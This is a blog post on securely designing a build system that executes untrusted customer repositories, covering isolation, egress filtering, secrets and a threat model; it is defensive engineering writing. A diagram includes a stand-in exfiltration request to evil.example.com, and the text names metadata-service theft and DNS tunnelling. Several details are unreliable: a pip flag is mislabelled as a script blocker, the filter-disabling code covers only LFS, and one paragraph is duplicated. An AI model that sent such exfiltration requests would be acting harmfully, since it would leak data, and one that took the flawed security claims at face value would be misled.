---
title: 'Designing a Build System That Runs Untrusted Code'
description: >-
  A deep technical walkthrough of what it takes to design a build system that
  securely executes arbitrary customer repositories and turns build output into
  deployable artifacts—covering the pipeline, the security model, the
  architecture, and the operational realities.
date: 2026-03-16
modified: 2026-03-17
tags:
  - architecture
  - security
  - infrastructure
---

So, you (or, in this case—a younger, less-wise version of _me_) want to build a platform that accepts a Git repository URL from a _stranger_, runs whatever code is inside it on your infrastructure, and produces something you're willing to serve to the internet. Or, in my case—maybe you just want to pull down a repository and do some static analysis on the code with an agent or perhaps even make modifications to it. The specific task varies, but they all share a few things in common. The reality is that every interesting design decision in this kind of system follows from a single uncomfortable fact: you are running untrusted code.

And, there are a thousand flavors of this: Everything from a CodeSandbox-flavored runtime to some of the products we're seeing now like Claude Code for Web or Cursor's Agents.

It sounds obvious when you say it out loud: but, the implications are sneaky. Every `npm install` is arbitrary code execution—`postinstall` scripts run whatever they want. Every `pip install` can execute a `setup.py`. Every `go generate` runs shell commands embedded in source comments. The build step itself is just more arbitrary code execution on top of that. You're not just compiling source files. You're handing a stranger a shell on your machine and hoping they do something reasonable with it. And, like, we haven't even gotten to the unpredictable LLM-powered agent that might be working on the code that you just cloned. (I have _not_ played around with Deno as much as I should—but my understanding is that a non-zero amount of protection from these kinds of vulnerabilities is baked into it.)

> [!NOTE] A somewhat important disclaimer
> For a while, I was building something similar to what Claude Code or Cursor do on the web: pull down a repository into a container and have an agent make changes. Needless to say, I have some experience in this area, but I should note that my thoughts on this topic are definitely still evolving—and I reserve the right to update some of my thoughts on this topic.

This post walks through the design of a system like that—from the moment a build request arrives to the moment an artifact is ready for deployment. I'll cover the pipeline stages (source fetch, dependency install, build execution, artifact packaging), the security model (isolation tiers, network egress filtering, secrets lifecycle, threat modeling), the architecture of the control plane and ephemeral workers, and the landscape of managed sandbox platforms that can run these workloads for you. Then we'll get into the operational realities: caching and cache poisoning, build logs and secret scrubbing, retries and failure recovery, SLOs, billing, and debugging. The goal is to be concrete enough that you could actually start building this, while staying grounded enough in the real product landscape that the design decisions transfer regardless of which cloud or platform you're on.

## The shape of a build

Before things get complicated, it helps to name the stages. A build, at its simplest, is a pipeline with five discrete phases. Each transforms an input into an output, and each introduces its own category of problems.

```mermaid
graph LR
    A["Source Fetch"] -->|"source tree"| B["Dependency Install"]
    B -->|"source + deps"| C["Build Execution"]
    C -->|"output directory"| D["Artifact Packaging"]
    D -->|"artifact"| E["Deployment Handoff"]
```

**Source fetch**: clone the customer's repository and get the relevant files onto disk. **Dependency install**: resolve and fetch third-party packages. **Build execution**: run the customer's build command (or infer one). **Artifact packaging**: normalize the build output into a format your deployment system understands. **Deployment handoff**: store the artifact and notify the downstream system that it's ready.

That's the whole pipeline. It's conceptually linear, but the implementation is anything decidedly _not_. Caching, concurrency, security boundaries, and failure recovery all add nonlinear complexity. We'll start at the beginning and work our way through, stopping at each point where things get harder than they look.

## Source fetch and the trust boundary it creates

Cloning a customer's repository is the first moment untrusted data enters your system. Even before any build command runs, `git clone` itself is doing more than you might expect.

A full clone downloads the entire commit history, which is wasteful when you only need the latest commit. Shallow clones (`--depth 1`) fix that—but they break monorepo tooling that relies on git history to determine which packages changed. Sparse checkout lets you clone only a subdirectory, which matters for large monorepos where the build target is one package among hundreds.

Submodules are where things get interesting from a trust perspective. Each submodule is another repository you're cloning from an arbitrary URL. A project could reference a submodule hosted on an attacker-controlled server. That server could serve different content depending on when or from where the clone request arrives. The trust boundary isn't just the top-level repository—it's every transitive dependency in the submodule graph.

Then there's `.gitattributes`. Git supports custom **filter drivers**—commands that run automatically during checkout to transform file contents. A malicious `.gitattributes` can specify a filter that executes arbitrary shell commands the moment you check out the working tree. Most people don't know this feature exists, which makes it a particularly effective attack vector.

```typescript title="source-fetch.ts"
interface FetchOptions {
  repositoryUrl: string;
  ref: string;
  depth: number | 'full';
  sparsePaths?: string[];
  submodulePolicy: 'none' | 'shallow' | 'recursive';
  // [!note Each submodule is another trust boundary you're crossing.]
  lfsPolicy: 'skip' | 'fetch';
  disableFilters: boolean;
}

async function fetchSource(options: FetchOptions): Promise<SourceTree> {
  const cloneArgs = ['clone', '--single-branch', '--branch', options.ref];

  if (options.depth !== 'full') {
    cloneArgs.push('--depth', String(options.depth));
  }

  if (options.disableFilters) {
    // [!note Disable .gitattributes filter drivers to prevent arbitrary command execution.]
    cloneArgs.push('--config', 'filter.lfs.process=', '--config', 'filter.lfs.smudge=');
  }

  await exec('git', [...cloneArgs, options.repositoryUrl, workDir]);

  if (options.submodulePolicy !== 'none') {
    await exec('git', ['submodule', 'update', '--init', `--depth=1`], { cwd: workDir });
  }

  return { path: workDir, commit: await resolveHead(workDir) };
}
```

That `disableFilters` flag is doing real security work. Without it, checking out the working tree is already arbitrary code execution—before you've even looked at the `package.json`.

## Dependency installation as arbitrary code execution

With source on disk, the next step is installing dependencies. This is—not to be dramatic about it—the most dangerous phase of the entire pipeline.

When you run `npm install`, npm doesn't just download packages. It executes lifecycle scripts: `preinstall`, `install`, `postinstall`. Any package in the dependency tree can include these scripts, and they run with the full privileges of the user that invoked `npm`. The same is true across ecosystems: `pip install` can run `setup.py`, Ruby's `gem install` can execute `extconf.rb`, and so on.

The first decision is figuring out _which_ package manager the project uses. This is less straightforward than it sounds, because different managers use different lockfiles, different install semantics, and different approaches to lifecycle scripts.

| Package Manager | Lockfile            | Clean Install                     | Runs Lifecycle Scripts      | Script Disable Flag              |
| --------------- | ------------------- | --------------------------------- | --------------------------- | -------------------------------- |
| npm             | `package-lock.json` | `npm ci`                          | Yes                         | `--ignore-scripts`               |
| yarn (classic)  | `yarn.lock`         | `yarn install --frozen-lockfile`  | Yes                         | `--ignore-scripts`               |
| yarn (berry)    | `yarn.lock`         | `yarn install --immutable`        | Yes                         | `enableScripts: false`           |
| pnpm            | `pnpm-lock.yaml`    | `pnpm install --frozen-lockfile`  | Yes                         | `--ignore-scripts`               |
| bun             | `bun.lockb`         | `bun install --frozen-lockfile`   | Yes                         | `--ignore-scripts`               |
| pip             | `requirements.txt`  | `pip install -r requirements.txt` | Yes (`setup.py`)            | `--no-build-isolation` (partial) |
| Go              | `go.sum`            | `go mod download`                 | No (but `go generate` does) | N/A                              |

The "clean install" column matters for reproducibility. `npm ci` deletes `node_modules` and installs exactly what's in the lockfile, refusing to run if the lockfile doesn't match `package.json`. This is what you want in a build system—if a customer's lockfile is out of sync, the build should fail rather than silently resolving to different versions.

```typescript title="package-manager.ts"
interface PackageManagerConfig {
  name: string;
  installCommand: string[];
  lockfile: string;
  scriptDisableFlag: string;
}

function resolvePackageManager(rootDir: string): PackageManagerConfig {
  if (existsSync(join(rootDir, 'bun.lockb'))) {
    return {
      name: 'bun',
      installCommand: ['bun', 'install', '--frozen-lockfile'],
      lockfile: 'bun.lockb',
      scriptDisableFlag: '--ignore-scripts',
    };
  }

  if (existsSync(join(rootDir, 'pnpm-lock.yaml'))) {
    return {
      name: 'pnpm',
      installCommand: ['pnpm', 'install', '--frozen-lockfile'],
      lockfile: 'pnpm-lock.yaml',
      scriptDisableFlag: '--ignore-scripts',
    };
  }

  // [!note Presence of yarn.lock alone isn't enough—check for .yarnrc.yml to distinguish classic from berry.]
  if (existsSync(join(rootDir, 'yarn.lock'))) {
    const isBerry = existsSync(join(rootDir, '.yarnrc.yml'));
    return {
      name: isBerry ? 'yarn-berry' : 'yarn-classic',
      installCommand: isBerry
        ? ['yarn', 'install', '--immutable']
        : ['yarn', 'install', '--frozen-lockfile'],
      lockfile: 'yarn.lock',
      scriptDisableFlag: '--ignore-scripts',
    };
  }

  return {
    name: 'npm',
    installCommand: ['npm', 'ci'],
    lockfile: 'package-lock.json',
    scriptDisableFlag: '--ignore-scripts',
  };
}
```

The `scriptDisableFlag` is the key safety lever. If you disable lifecycle scripts during install, you cut off the most common arbitrary code execution path. But some packages genuinely need post-install scripts—native addons that compile C code, for example. You have two options: run install with scripts disabled and maintain an allow-list of packages that are permitted to run scripts, or run the entire install phase inside the isolation sandbox (which we'll design shortly) and let scripts run freely within those constraints.

The second approach is simpler and more compatible, but it means your isolation boundary needs to be up before dependency installation, not just before build execution. That's a meaningful architectural decision.

## Caching and cache poisoning

If the inputs to a build step haven't changed, the output won't change either. Caching aggressively—so you don't repeat work across builds—is the obvious optimization. The trick is defining "inputs" precisely enough that cache hits are reliable and broadly enough that cache misses are rare. A content-addressable model works well: hash everything that affects the output, and use that hash as a cache key.

```typescript title="cache.ts"
async function computeCacheKey(task: BuildTask): Promise<string> {
  const inputs = [
    await hashDirectory(task.sourceDir),
    await hashFile(task.lockfilePath),
    task.buildCommand,
    // [!note Missing an env var here means cache hits produce wrong output silently.]
    ...task.environmentVariables.sort().map((e) => `${e.name}=${e.value}`),
    task.builderImageVersion,
  ];

  return createHash('sha256').update(inputs.join('\n')).digest('hex');
}
```

The cache lookup flow has two tiers: a local cache on the build machine (fast but limited to that machine's history) and a remote cache shared across all build machines (slower but much higher hit rate).

```mermaid
graph TD
    A["Compute cache key"] --> B{"Local cache hit?"}
    B -->|"Yes"| C["Use local artifact"]
    B -->|"No"| D{"Remote cache hit?"}
    D -->|"Yes"| E["Download and use"]
    D -->|"No"| F["Run build"]
    F --> G["Store in local cache"]
    F --> H["Store in remote cache"]
```

Remote caching introduces a security concern that deserves its own callout: **cache poisoning**. If an attacker can write to your shared cache—either by exploiting a build that runs their code, or by compromising the cache storage directly—they can replace legitimate cached artifacts with malicious ones. Every subsequent build that hits that cache key gets the poisoned output. We'll come back to this in the security sections, but the mitigation starts here: cache keys must be tamper-proof, cache writes should be scoped to the build that produced them, and cache reads should verify content integrity (the hash of the retrieved artifact must match the cache key).

## The isolation model

Everything we've discussed so far—source fetch, dependency install, build execution—runs inside some kind of sandbox. The design of that sandbox is where the hardest decisions live, because you're balancing three competing concerns: how strong the isolation is, how fast it starts up, and how much it costs.

There are three tiers of isolation technology, each with a different position on that tradeoff triangle.

**Containers** use Linux kernel features—namespaces for resource visibility isolation, cgroups for resource limits, and seccomp for syscall filtering. They share the host kernel. A process inside a container thinks it has its own filesystem, network stack, and process tree, but it's running on the same kernel as every other container on that machine. Startup is fast (milliseconds to low seconds), resource overhead is minimal, and the tooling ecosystem is mature.

The catch is the shared kernel. A kernel vulnerability is a container escape. This isn't theoretical—container escapes via kernel exploits have happened repeatedly in production. A default container configuration (the kind you get from a stock `docker run`) is not hardened. You need to layer on a restrictive seccomp profile that blocks dangerous syscalls, a read-only root filesystem, dropped capabilities (no `CAP_SYS_ADMIN`, no `CAP_NET_RAW`, no `CAP_SYS_PTRACE`), and a minimal base image with no unnecessary tooling.

Even with all of that, the shared kernel remains. For a multi-tenant build system where you're running code from strangers, containers alone are a calculated risk.

**MicroVMs** run each build inside a lightweight virtual machine with its own kernel. The pioneering implementation in this space uses a stripped-down VMM (virtual machine monitor) purpose-built for serverless workloads—no BIOS, no PCI bus emulation, no legacy device support. Startup times are sub-second. Memory overhead is tens of megabytes rather than the gigabytes a traditional VM requires. Each build gets its own kernel, so a kernel exploit only compromises the guest kernel—it doesn't reach the host or other builds.

The operational cost is higher than containers. You need to manage VM images, handle the boot sequence, and deal with the fact that a microVM is a real (if minimal) operating system. Networking setup is more complex. Storage attachment is less flexible. But the security boundary is dramatically stronger.

**Full VMs** provide the strongest isolation—a complete hardware-virtualized environment with its own kernel, BIOS, and device emulation. Startup times are measured in seconds to minutes. Resource overhead is significant (each VM reserves dedicated memory and CPU). This is the traditional approach for multi-tenant compute, and it works, but the startup latency and resource cost make it impractical for a build system where you might be running thousands of builds per hour.

| Property          | Container      | MicroVM             | Full VM            |
| ----------------- | -------------- | ------------------- | ------------------ |
| Startup time      | ~100ms         | ~125ms–1s           | 10s–60s            |
| Kernel isolation  | Shared         | Dedicated (minimal) | Dedicated (full)   |
| Memory overhead   | ~5MB           | ~30–50MB            | ~256MB–1GB         |
| Escape complexity | Kernel exploit | VMM exploit         | Hypervisor exploit |
| Operational cost  | Low            | Medium              | High               |

> [!WARNING] Shared kernels
> A container with a hardened seccomp profile, dropped capabilities, and a read-only root filesystem is _much_ better than a default container. But it still shares a kernel with every other container on the host. For multi-tenant build systems running untrusted code, this is the fundamental limitation. MicroVMs exist specifically to address this gap—same-order-of-magnitude startup cost, with a dedicated kernel per build.

Most multi-tenant build platforms that take security seriously have converged on microVMs or equivalent technologies. The startup latency penalty over containers is small (hundreds of milliseconds), and the security improvement is large (an entirely separate kernel).

The choice you make here cascades through the rest of the architecture. If you use microVMs, you need a provisioning pipeline that can create and destroy VMs at the rate you receive build requests. If you use containers, you need a host-level security posture that accounts for the shared kernel. If you use full VMs, you need a warm pool to absorb startup latency. We'll come back to provisioning when we discuss the control plane.

## Ephemeral sandboxes and where to run them

So, you've decided on an isolation _technology_—containers, microVMs, whatever. The next question is where these things actually run. And, increasingly, the answer is: you don't build it yourself.

An **ephemeral sandbox** is an isolation boundary that exists for the duration of a single task and is destroyed afterward. No state carries over between sandboxes. No two builds share a filesystem, a process namespace, or a kernel. The sandbox is created, the work happens inside it, the output is extracted, and the whole thing is torn down. This is the model you want for running untrusted code, because it eliminates an entire category of cross-contamination bugs by making them architecturally impossible. There's no state to leak if the state doesn't survive the sandbox.

The good news is that the landscape of managed ephemeral sandbox platforms has gotten genuinely interesting. You don't necessarily need to operate your own fleet of Firecracker hosts anymore—though you still can, and sometimes should.

**E2B** is probably the most direct answer to "I need a sandbox for AI agent workloads." It runs Firecracker microVMs behind an API. You call `Sandbox.create()`, get a sandbox with its own filesystem, its own network namespace, and its own kernel—booted in roughly 150 milliseconds. You can run shell commands, read and write files, install packages, and interact with the sandbox over WebSocket or HTTP. Sandboxes persist for up to 24 hours, and they support pause/resume—snapshotting the full VM state (filesystem, memory, running processes) so you can pick up where you left off. The orchestration layer uses Nomad and Terraform under the hood, and the infrastructure is open source. If you're building something where an LLM needs to execute code—which is basically what this whole post is about—E2B is purpose-built for that use case.

**Vercel Sandbox** is the newer entrant, generally available since early 2026. It's also Firecracker under the hood—the same infrastructure that powers Vercel's own build system (they process millions of deployments per day on it). Each sandbox is a full microVM running Amazon Linux 2023, with up to 8 vCPUs and 16 GB of memory. You get `sudo` access, a real filesystem, and the ability to install arbitrary system packages. Vercel bills on "active CPU" time—you're only charged when the CPU is actually computing, not when it's idle waiting on I/O—which is a genuinely useful pricing model for build workloads that spend a lot of time waiting on network. Snapshots let you capture filesystem state and restore from it faster than a cold start. If you're already in the Vercel ecosystem, or if you've seen what v0 does when it generates and runs code in the browser, that's this product.

**Cloudflare** has two relevant offerings, and they sit at different points on the isolation spectrum. **Workers** use V8 isolates—the same sandboxing technology that keeps browser tabs from interfering with each other. Each Worker runs in its own isolate with 128 MB of memory and sub-millisecond cold starts. The tradeoff is that you're constrained to JavaScript and WebAssembly, and you don't get a filesystem or a shell. For running `npm install` and a build command: not the right tool. But, for lighter workloads where you need to run untrusted JavaScript specifically, the startup speed and cost efficiency are hard to beat. **Cloudflare Containers** is the heavier offering—Firecracker microVMs with full Linux environments, controlled through their Workers platform. You get a real filesystem, real networking, and the ability to run arbitrary binaries. The Sandbox SDK layers a developer-friendly API on top of Containers, giving you programmatic access to execute commands, read and write files, and manage the sandbox lifecycle.

**AWS** is where Firecracker was born. Lambda and Fargate both use Firecracker under the hood to isolate tenant workloads—each function invocation or Fargate task runs inside its own microVM with a dedicated kernel. You can't use raw Firecracker through a managed AWS API (it's infrastructure _for_ their services, not a service itself), but you _can_ run Firecracker directly on bare-metal EC2 instances if you want full control over the orchestration. This is the "build it yourself" path: maximum flexibility, maximum operational burden.

**Google Cloud** takes a different approach with **gVisor**, a user-space kernel written in Go. Cloud Run and GKE Sandbox both use gVisor to intercept system calls from the sandboxed process and handle them without passing them to the host kernel. It's not a VM—there's no hardware virtualization boundary—but it dramatically reduces the kernel attack surface compared to a regular container. The Sentry (gVisor's core component) re-implements a significant chunk of the Linux syscall interface, which means most code runs without modification. Google also layers hardware-backed isolation on top of gVisor in Cloud Run, giving you two boundaries: a software kernel layer _and_ a hardware virtualization layer.

**Deno Subhosting** is worth mentioning if your workload is JavaScript or TypeScript. It uses V8 isolates with additional OS-level isolation: seccomp syscall filtering, cgroup resource limits, and separate network namespaces. Each deployment runs in its own isolate in its own process. Filesystem access is virtualized—it looks like a real filesystem from inside the sandbox, but it's scoped and ephemeral. The runner acts as an "isolate hypervisor," managing the lifecycle of V8 isolates the way a traditional hypervisor manages VMs. If you're building a platform where users deploy JavaScript—think a CodeSandbox competitor or a serverless functions platform—Subhosting is essentially the isolation layer, packaged as a service.

**Fly.io** runs Firecracker microVMs and gives you a managed API for creating and destroying them. **Modal** has sandboxes designed specifically for AI workloads—you can spin up a container, run code in it, and tear it down through their Python SDK.

The common thread across all of these is that the isolation boundary is ephemeral and the API is programmatic. You don't SSH into a box and start a Docker container. You make an API call, get a sandbox, do your work, and the sandbox disappears. The differences are in the isolation technology (V8 isolates vs. gVisor vs. Firecracker vs. full VMs), the API surface (SDK vs. REST vs. CLI), and the operational model (fully managed vs. self-hosted with tooling).

| Platform              | Isolation Technology    | Startup Latency  | Full Linux Environment | Primary Use Case              |
| --------------------- | ----------------------- | ---------------- | ---------------------- | ----------------------------- |
| E2B                   | Firecracker microVMs    | ~150ms           | Yes                    | AI agent code execution       |
| Vercel Sandbox        | Firecracker microVMs    | Sub-second       | Yes                    | AI agents and build execution |
| Cloudflare Workers    | V8 isolates             | ~5ms             | No                     | Lightweight JS/Wasm execution |
| Cloudflare Containers | Firecracker microVMs    | ~2–10s (prewarm) | Yes                    | General-purpose sandboxing    |
| AWS Lambda/Fargate    | Firecracker microVMs    | ~125ms           | Yes (constrained)      | Serverless compute            |
| Google Cloud Run      | gVisor + hardware VM    | ~1–2s            | Yes                    | Container workloads           |
| Deno Subhosting       | V8 isolates + OS layers | <1s              | No (virtualized FS)    | JavaScript/TypeScript hosting |
| Fly.io                | Firecracker microVMs    | ~500ms           | Yes                    | General-purpose compute       |
| Modal                 | Containers (gVisor)     | ~1s              | Yes                    | AI/ML workloads               |

For a build system running untrusted code—the thing this whole post is about—you want a full Linux environment (because builds need `npm`, `pip`, `go`, and all the associated tooling), you want kernel-level isolation (because you're running a stranger's code), and you want sub-second startup (because builds are latency-sensitive). That narrows the field to Firecracker-based options: E2B, Vercel Sandbox, Cloudflare Containers, Fly.io, or rolling your own on bare metal with Firecracker directly. The choice between managed and self-hosted depends on how much operational complexity you're willing to absorb—and how much control you need over the networking and storage layers that wrap the sandbox.

## Network egress and supply-chain exposure

Builds need the internet. Dependency installation fetches packages from registries. Build steps may download tools, pull base images, or call external APIs. That network access is also a channel for data exfiltration—a malicious build could `curl` your internal metadata service, phone home with stolen secrets, or tunnel out through DNS.

The straightforward mitigation is egress filtering: allow traffic to known-good destinations and block everything else. In practice, this means maintaining an allow-list of package registries (`registry.npmjs.org`, `pypi.org`, `rubygems.org`, `proxy.golang.org`, etc.) and blocking all other outbound traffic.

```mermaid
sequenceDiagram
    participant Build as Build Worker
    participant Proxy as Egress Proxy
    participant Registry as Package Registry
    participant Blocked as Blocked Destination

    Build->>Proxy: GET registry.npmjs.org/lodash
    Proxy->>Proxy: Check allow-list
    Proxy->>Registry: Forward request
    Registry-->>Proxy: 200 OK (package tarball)
    Proxy-->>Build: 200 OK

    Build->>Proxy: POST evil.example.com/exfiltrate
    Proxy->>Proxy: Check allow-list
    Proxy-->>Build: 403 Forbidden
```

There are several ways to implement this. **DNS-based filtering** resolves domain names through a controlled DNS server that refuses to resolve blocked domains. It's simple but coarse—you can block domains but not paths, and it doesn't work if the build uses IP addresses directly. **Proxy-based filtering** routes all traffic through an HTTP/HTTPS proxy that inspects the destination and applies policy. It's more granular (you can allow specific paths or methods) but adds latency and requires all build tools to respect proxy environment variables. **Network policy** at the infrastructure level (firewall rules, security groups) is the most reliable—traffic never leaves the network interface—but the least flexible to update.

```typescript title="egress-policy.ts"
interface EgressPolicy {
  allowedDomains: string[];
  allowedPorts: number[];
  // [!note DNS resolution happens inside the sandbox—the proxy validates the resolved address too.]
  dnsPolicy: 'proxy-controlled' | 'sandbox-local';
  blockMetadataService: boolean;
  maxEgressBytesPerBuild: number;
}

const defaultPolicy: EgressPolicy = {
  allowedDomains: [
    'registry.npmjs.org',
    'registry.yarnpkg.com',
    'pypi.org',
    'files.pythonhosted.org',
    'proxy.golang.org',
    'rubygems.org',
    'crates.io',
  ],
  allowedPorts: [443, 80],
  dnsPolicy: 'proxy-controlled',
  blockMetadataService: true,
  maxEgressBytesPerBuild: 2 * 1024 * 1024 * 1024,
};
```

That `blockMetadataService` flag is critical. Cloud metadata services (typically available at `169.254.169.254`) expose instance credentials, project IDs, and other sensitive information. A build that can reach the metadata service can potentially escalate privileges far beyond the sandbox.

Beyond egress, the supply-chain attack surface during dependency installation is broad. **Typosquatting** registers package names that are one character off from popular packages (`lodassh` instead of `lodash`). **Dependency confusion** exploits the lookup order between public and private registries—if your project uses a private package called `@company/utils` and an attacker publishes a public package with the same name and a higher version number, some package managers will prefer the public one. **Compromised maintainer accounts** inject malicious code into legitimate packages. **Malicious post-install scripts** execute during `npm install` without any explicit user action.

The defenses are layered. Lockfile integrity verification catches unexpected version changes. Disabling lifecycle scripts (or running them inside the sandbox) limits post-install attacks. Scoped registries (pointing `@company/*` to your private registry exclusively) prevent dependency confusion. But there's no single defense that covers all vectors—this is a problem that requires defense in depth.

## Secrets injection and lifecycle

Builds need secrets. API keys for external services, deploy tokens for artifact registries, authentication credentials for private package registries. How you get those secrets into the build—and more importantly, when and where—is a security-critical design decision.

The core principle is **late injection**: secrets should enter the build environment as late as possible and be scoped as narrowly as possible. A deploy token has no business being available during `npm install`. A package registry credential shouldn't be accessible during the build step. Each secret should be available only during the phase that actually needs it.

```typescript title="secrets-policy.ts"
type BuildPhase = 'source-fetch' | 'dependency-install' | 'build' | 'artifact-upload' | 'deploy';

interface SecretBinding {
  name: string;
  // [!note A deploy token visible during dependency install is a leaked secret.]
  allowedPhases: BuildPhase[];
  injectionMethod: 'environment-variable' | 'mounted-file' | 'secrets-manager-reference';
  rotationIntervalHours: number;
}

interface SecretsPolicy {
  bindings: SecretBinding[];
  logScrubbing: 'pattern-based' | 'value-based' | 'both';
  maxSecretSizeBytes: number;
  auditAccess: boolean;
}
```

**Injection methods** have different security profiles. Environment variables are the simplest—every tool understands them—but they're also the leakiest. They show up in `/proc/self/environ`, in crash dumps, in `printenv` output, and in framework error pages that dump the environment. Mounted files (a secret written to a tmpfs path that the build reads) are harder to accidentally leak but require the build to know where to look. Secrets manager references (where the build receives a token that can fetch the real secret from a secrets manager API) add a layer of indirection that improves audit trails but adds latency and complexity.

The biggest operational headache with secrets is **log scrubbing**. Builds produce logs, and secrets end up in logs constantly. A developer runs `echo $DATABASE_URL` to debug a connection problem. A framework dumps the environment on startup. An error message includes the authorization header that failed. If those logs leave the sandbox un-scrubbed, the secret is compromised.

Log scrubbing needs to happen at the boundary—inside the sandbox, before logs are streamed to the control plane. Two approaches work in tandem: **pattern-based scrubbing** matches known secret formats (AWS access keys, GitHub tokens, base64-encoded credentials) using regex. **Value-based scrubbing** takes the set of secret values that were injected into this build and masks any log line containing any of those values. You need both, because pattern-based scrubbing catches secrets your system didn't inject (leaked by dependencies), and value-based scrubbing catches secrets that don't match common patterns.

## Threat model and resource quotas

With the security controls described—isolation, egress filtering, secrets scoping, log scrubbing—it's worth stepping back and naming the threats explicitly. A threat model makes the defenses legible and exposes gaps.

An attacker submitting a build to your platform has four categories of goals. **Resource theft:** use your compute to mine cryptocurrency or run other workloads. **Data exfiltration:** steal secrets, source code, or build artifacts belonging to other customers. **Lateral movement:** escape the sandbox to reach the control plane, the host machine, or other customers' builds. **Supply-chain insertion:** inject malicious code into build output that gets deployed to production.

Each goal maps to specific attack vectors, and each vector maps to one or more defense layers.

| Threat                         | Primary Defense                          | Secondary Defense                         |
| ------------------------------ | ---------------------------------------- | ----------------------------------------- |
| Crypto mining / resource theft | CPU time limits, process quotas          | Anomaly detection on resource usage       |
| Secret theft from environment  | Phase-scoped injection                   | Log scrubbing, rotation                   |
| Cross-tenant data access       | Per-build isolation (microVM)            | No shared writable storage between builds |
| Sandbox escape                 | MicroVM kernel boundary                  | Minimal attack surface, host hardening    |
| Data exfiltration via network  | Egress allow-list                        | Bandwidth limits, DNS filtering           |
| Cache poisoning                | Content-addressed keys, integrity checks | Per-customer cache namespaces             |
| Malicious build output         | Artifact scanning                        | Provenance verification                   |
| Dependency supply-chain attack | Lockfile verification, script disable    | Registry allow-listing                    |

**Artifact scanning** deserves a closer look, because it's the last line of defense before malicious output reaches your deployment system. Scanning runs after the build completes but before the artifact is written to the content-addressed store—it's a blocking gate, not an advisory check. At minimum, you're running signature-based detection against known malware families (ClamAV or a commercial equivalent). More sophisticated setups add behavioral heuristics: flagging artifacts that contain obfuscated JavaScript, unexpected binary executables in what should be a static site, or files that look like reverse shells. False positives are inevitable, especially with minified code that triggers obfuscation heuristics. The practical approach is to block on high-confidence matches and flag low-confidence ones for async review, rather than failing every build that trips a heuristic. Provenance verification complements scanning by ensuring the artifact's contents are traceable back to a specific source commit and build configuration—so even if something slips past the scanner, you can reconstruct exactly what produced it.

> [!NOTE] Defense in depth
> No single layer in this table is sufficient on its own. The security model assumes any individual layer can fail. Cache poisoning might bypass lockfile verification. A microVM might have a VMM vulnerability. Log scrubbing might miss a secret in an unexpected format. The defenses work because they're layered—an attacker needs to defeat multiple independent controls to achieve their goal.

**Artifact scanning** deserves a closer look because it's the last line of defense before malicious output reaches production. The scan runs after the build produces output but before the artifact is promoted to the deployment store—a blocking gate, not an advisory step. At minimum, you're checking for known malware signatures (ClamAV or a commercial equivalent), but signature matching alone won't catch novel payloads. Behavioral heuristics help: flagging artifacts that contain embedded scripts in unexpected file types, binaries in a directory that should only contain static assets, or files that attempt to override deployment configuration. False positives are inevitable, so you need an escape valve—quarantine the artifact rather than silently dropping it, notify the customer with enough detail to understand what triggered the flag, and provide a way to request manual review. The key architectural decision is that scanning must be synchronous and blocking: if the scanner is down, builds queue rather than skip the check.

**Resource quotas** are the primary defense against the simplest attack: just using too many resources. A fork bomb that spawns thousands of processes. A build that allocates 64 GB of memory. A dependency install that writes 100 GB of cache to disk.

Quotas operate at several levels. **CPU time limits** cap total compute. You can enforce this as wall-clock time (kill the build after 30 minutes) or CPU time (kill after 15 CPU-minutes, regardless of how long it's been running). Wall-clock limits are simpler for customers to understand; CPU-time limits are fairer for the platform. **Memory limits** use cgroup memory controllers to cap RSS. When a build exceeds its memory limit, the OOM killer terminates it—this is a hard limit with no graceful degradation. **Disk quotas** limit the filesystem space available inside the sandbox. **Process count limits** prevent fork bombs by capping the number of concurrent processes.

**Fairness** is the higher-order problem. Even with per-build quotas, a single customer running 50 concurrent builds consumes more platform resources than one running 2. Fairness scheduling—where each customer's builds compete for resources within a per-customer allocation rather than globally—prevents any single customer from monopolizing the build queue.

## Control plane and worker architecture

The threat model shapes the architecture. Every decision about worker lifecycle, queue design, and storage follows from the constraints we've established.

The **control plane** is the trusted half of the system. It accepts build requests, manages state, schedules work, and exposes the API. It never runs untrusted code. The control plane consists of a few core components: an API gateway that authenticates requests and validates input, a **scheduler** that assigns builds to workers, a **state store** that tracks build lifecycle and metadata, and a **secrets manager** interface that retrieves secrets for injection at the appropriate build phase.

**Workers** are the untrusted half. Each worker is an ephemeral isolation boundary—created for a single build and destroyed after. The worker lifecycle is a state machine with a small number of states and well-defined transitions.

```typescript title="worker-lifecycle.ts"
type WorkerState = 'provisioning' | 'ready' | 'running' | 'extracting' | 'destroying' | 'destroyed';

interface WorkerLifecycle {
  state: WorkerState;
  buildId: string;
  createdAt: Date;
  lastHeartbeat: Date;
  resourceLimits: ResourceQuota;

  provision(): Promise<void>; // provisioning -> ready
  startBuild(): Promise<void>; // ready -> running
  extractOutput(): Promise<void>; // running -> extracting
  destroy(): Promise<void>; // extracting -> destroying -> destroyed
}
```

The lifecycle is linear and one-directional. A worker never goes from `running` back to `ready`. Once a build completes (or fails, or times out), the worker is destroyed. This eliminates an entire category of bugs and security issues—there's no state from one build that can leak into another, because the isolation boundary itself is torn down between builds.

```mermaid
graph TD
    API["API Gateway"] --> Scheduler
    Scheduler --> Queue["Priority Queue"]
    Queue --> WP["Worker Pool"]

    subgraph "Control Plane (trusted)"
        API
        Scheduler
        StateStore["State Store"]
        SecretsMgr["Secrets Manager"]
    end

    subgraph "Worker Pool (untrusted)"
        W1["Worker 1<br/>(microVM)"]
        W2["Worker 2<br/>(microVM)"]
        W3["Worker N<br/>(microVM)"]
    end

    WP --> W1
    WP --> W2
    WP --> W3

    W1 --> ArtifactStore["Artifact Storage"]
    W1 --> LogStore["Log Storage"]
    W2 --> ArtifactStore
    W2 --> LogStore
    W3 --> ArtifactStore
    W3 --> LogStore

    Scheduler --> StateStore
    W1 --> StateStore
    SecretsMgr --> WP
```

The **queueing model** handles the mismatch between build request arrival rate and worker capacity. Builds aren't all equal—a production deployment should jump ahead of a preview build for a feature branch. A priority queue with at least two tiers (urgent and normal) handles this. Within each tier, FIFO ordering is fair. Across tiers, urgent builds preempt normal builds in the scheduling order (but don't preempt _running_ builds—preemption adds complexity and risk for minimal gain).

**Autoscaling** is driven by queue depth. When the queue grows beyond a threshold, provision more workers. When it shrinks, let idle workers drain and terminate. But worker provisioning isn't instant—even microVMs take a few hundred milliseconds to start, and that's before you've loaded the build toolchain. A **warm pool** of pre-provisioned workers absorbs latency spikes: keep a small number of ready workers available at all times, and replenish the pool as workers are consumed. The warm pool size is a cost/latency tradeoff—more warm workers mean lower scheduling latency but higher idle resource cost.

## Artifact packaging and storage

